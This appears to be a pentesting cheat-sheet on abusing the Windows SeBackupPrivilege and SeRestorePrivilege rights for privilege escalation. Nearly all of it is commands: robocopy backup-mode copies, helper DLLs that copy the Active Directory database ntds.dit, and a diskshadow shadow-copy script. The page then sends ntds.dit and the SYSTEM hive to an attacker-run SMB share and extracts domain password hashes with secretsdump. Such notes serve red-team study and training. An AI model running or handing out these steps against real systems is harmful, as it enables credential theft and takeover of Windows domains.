---
title: "SeBackupPrivilege/SeRestorePrivilege"
date: 2024-7-18
tags: ["SeBackupPrivilege", "SeRestorePrivilege", "privesc", "Windows", "Backup Operators", "diskshadow", "secretsdump"]
---

### Abuse #1: Robocopy

<div>

```console
# For example
robocopy /b <TARGET_DIR_PATH> C:\Windows\Tasks <TARGET_FILE>
```

</div>

<br>

---

### Abuse #2: Using helper dlls

<div>

```console
import-module .\SeBackupPrivilegeCmdLets.dll
```

```console
import-module .\SeBackupPrivilegeUtils.dll
```

```console
Copy-FileSeBackupPrivilege <TARGET_FILE_PATH> C:\ProgramData\<TARGET_FILE>
```

```console
# For example
Copy-FileSeBackupPrivilege C:\Windows\ntds\ntds.dit C:\ProgramData\ntds.dit
```

</div>

<small>*Ref: [SeBackupPrivilegeUtils.dll](https://github.com/giuliano108/SeBackupPrivilege/blob/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll?raw=true)*</small>
<br>
<small>*Ref: [SeBackupPrivilegeCmdLets.dll](https://github.com/giuliano108/SeBackupPrivilege/blob/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll?raw=true)*</small>

<br>

---

### Abuse #3: Diskshadow

#### 1. Create a .dsh file

<div>

```console
set context persistent nowriters
set metadata C:\ProgramData\test.cab
set verbose on
add volume c: alias test
create
expose %test% x:
```

</div>

<br>

<div>

```console
# Convert to dos format
unix2dos vss.dsh
```

</div>

#### 2. Run vss.dsh

<div>

```console
# Upload and run
diskshadow /s C:\ProgramData\vss.dsh
```

</div>

#### 3. Host a smb server (In Linux)

<div>

```console
impacket-smbserver share . -smb2support
```

</div>

#### 4. Copy to local Linux

<div>

```console
net use \\<LOCAL_IP>\share
```

```console
Copy-FileSeBackupPrivilege x:\Windows\ntds\ntds.dit \\<LOCAL_IP>\share\ntds.dit
```

```console
reg.exe save hklm\system \\<LOCAL_IP>\share\system
```

</div>

#### 5. Secrets dump

<div>

```console
impacket-secretsdump -ntds ntds.dit -system system LOCAL
```

</div>

<br>